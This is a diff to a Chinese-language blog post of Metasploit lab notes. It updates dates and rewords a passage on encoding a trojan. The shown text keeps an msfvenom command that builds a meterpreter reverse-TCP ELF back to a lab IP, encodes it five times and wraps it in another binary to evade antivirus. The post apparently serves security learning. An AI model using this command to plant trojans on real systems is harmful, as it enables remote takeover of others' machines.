@@ -1,11 +1,11 @@
 ---
 title: "Metasploit 木马实验记录"
-date: 2022-4-2 23:29:09
+date: 2022-09-18 23:29:09
 tags: ["Metasploit", "msfvenom", "木马"]
 categories:
   - ["网络安全", "安全实验"]
 cover: https://res.cloudinary.com/sycamore/image/upload/v1792216255/Covers/87d91c5d20cc130aa72fe99c74a9e8c2.png
-updated: 2025-01-21 14:58:19.686
+updated: 2025-12-14 22:19:18
 ---
 
 :::default
@@ -82,16 +82,14 @@ Kali 中默认安装了 **Metasploit** 框架。
 查看可用的编码器：`msfvenom -l encoders`
 ![image-20230426010444808](https://res.cloudinary.com/sycamore/image/upload/v1792085343/Typora/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png)
 
-选用**免杀**效果较好的 **x86/shikata_ga_nai** 编译器进行编码。
+这里使用 x86/shikata_ga_nai 编码器进行编码，尝试降低样本被检测出的概率。
 命令：`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf`
 ![image-20230426010449517](https://res.cloudinary.com/sycamore/image/upload/v1792085341/Typora/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png)
 
 
-其中，**-e** 指定编译器为 **x86/shikata_ga_nai**，
+其中，**-e** 指定编码器为 **x86/shikata_ga_nai**，
 **-i** 指定编码的次数为 5 次。
-编码 **5** 次的木马，基本可以**躲避部分**杀软的查杀，
-
-当然可以对木马进行**更多次**的编码，这样可以**提高**木马的**免杀机率**，但是需要注意：这也可能会导致木马**不可使用**。
+编码次数可以调整，但次数更多不一定效果更好，也可能影响样本的正常运行。
 
 ## msfconsole 木马利用
 使用之前生成的木马文件： **payload.elf**。
